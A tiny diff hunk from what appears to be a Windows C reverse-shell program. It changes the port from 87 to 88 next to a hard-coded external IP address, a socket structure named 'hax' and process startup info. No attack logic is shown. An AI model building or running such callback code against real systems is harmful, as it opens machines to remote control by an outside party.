@@ -16,7 +16,7 @@ struct sockaddr_in hax;
 
 char ip_addr[16] = "93.93.112.211"; 
 
-char port[6] = "87";            
+char port[6] = "88";            
 
 STARTUPINFO ini_processo;
 
